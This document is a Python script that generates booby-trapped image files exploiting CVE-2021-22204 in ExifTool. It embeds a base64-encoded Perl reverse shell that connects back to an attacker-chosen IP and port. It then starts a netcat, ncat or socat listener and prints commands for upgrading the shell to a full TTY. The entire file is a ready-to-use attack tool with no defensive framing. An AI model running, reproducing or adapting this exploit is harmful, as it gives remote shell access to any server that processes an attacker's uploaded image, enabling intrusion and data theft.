#!/bin/env python3
"""
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Boris Burgarella wrote this file. As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return Poul-Henning Kamp
 * ----------------------------------------------------------------------------
"""

import argparse
import os
import subprocess
import base64

Header = """   _______      ________    ___   ___ ___  __      ___  ___  ___   ___  _  _   
  / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |    |__ \|__ \|__ \ / _ \| || |  
 | |     \ \  / /| |__ ______ ) | | | | ) || |______ ) |  ) |  ) | | | | || |_ 
 | |      \ \/ / |  __|______/ /| | | |/ / | |______/ /  / /  / /| | | |__   _|
 | |____   \  /  | |____    / /_| |_| / /_ | |     / /_ / /_ / /_| |_| |  | |  
  \_____|   \/   |______|  |____|\___/____||_|    |____|____|____|\___/   |_|

A small python exploit image files generator by Boris Burgarella
"""

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_with_colors(Text_str, color):
    print(color + Text_str + bcolors.ENDC)

# Parser init
parser = argparse.ArgumentParser(description="A simple python script to generate image payloads to exploit CVE-2021-22204 and get reverse shells")

# first argument, required: the IP of the listener
parser.add_argument('-iP','--adress', help=bcolors.GREEN +'IP'+ bcolors.ENDC+' adress of the listener', required=True)

# listener choice
help_str = "listener (default: nc), available listeners: \n"
help_str += bcolors.GREEN + "  [-] nc\n"
help_str += "  [-] ncat\n"
help_str += "  [-] ncat_TLS\n"
help_str += "  [-] socat_TTY\n" + bcolors.ENDC
parser.add_argument('-l','--listener', help=help_str)

# name of the image file to be supplied for modification
parser.add_argument('-f','--file', help=bcolors.GREEN +'Name'+bcolors.ENDC+' of the image file to modify', required=True)

# Port argument, I usually use 4444 so this is why this is the default
parser.add_argument('-p','--port', help=bcolors.GREEN +'Port'+bcolors.ENDC+' that you wish to use for the listener (default: 4444)')

def Parse_args():
    # let's get all the arguments
    args = vars(parser.parse_args())
    IP = args["adress"]

    if args["listener"]:
        listener = args["listener"]
    else:
        listener = "nc"
        
    OutputFileName = args["file"]

    if args["port"]:
        Port = args["port"]
    else:
        Port = "4444"

    return IP, Port, OutputFileName, listener

if __name__ == "__main__":
    print_with_colors(Header, bcolors.BLUE)
    IP, Port, OutputFileName, listener = Parse_args()
    
    payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
    payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({Port},inet_aton('{IP}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )
    payload = payload + b"'))};\")"

    print_with_colors("=============== Current config ==============", bcolors.GREEN)
    config_string =  "[+] Listener IP:       {}\n".format(IP)
    config_string += "[+] Port:              {}\n[+] Image file:        {}".format(Port, OutputFileName)
    print_with_colors(config_string, bcolors.GREEN)
    print_with_colors("=============================================\n", bcolors.GREEN)

    payload_file = open('temp_payload', 'w')
    payload_file.write(payload.decode('utf-8'))
    payload_file.close()

    subprocess.run(['bzz', 'temp_payload', 'payload.bzz'])
    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
    subprocess.run(['exiftool', '-config', 'configExif', '-HasselbladExif<=exploit.djvu', '{}'.format(OutputFileName)]) 
    os.system('rm *.djvu | rm temp_payload | rm payload.bzz')

    print(bcolors.CYAN + "\n====================================\n[+] - Starting listener on port {}\n====================================\n".format(Port) + bcolors.ENDC)
    print_with_colors("Copy and paste these commands to get a full TTY (once you get a ncat shell of course):", bcolors.CYAN)
    print_with_colors("$ script -qc /bin/bash /dev/null", bcolors.CYAN)
    print_with_colors("$ CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;\n", bcolors.CYAN)


    listener_command = "nc -lvvp {}".format(Port)
    if listener == "ncat":
        listener_command = "ncat -lvnp {}".format(Port)
    elif listener == "ncat_TLS":
        listener_command = "ncat --ssl -lvnp {}".format(Port)
    elif listener == "socat_TTY":
        listener_command = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{}".format(Port)
    else:
        if listener_command != "nc":
            print(bcolors.FAIL + "Warning: unknown listener, defaulting to nc" + bcolors.ENDC) 
    
    os.system(listener_command)
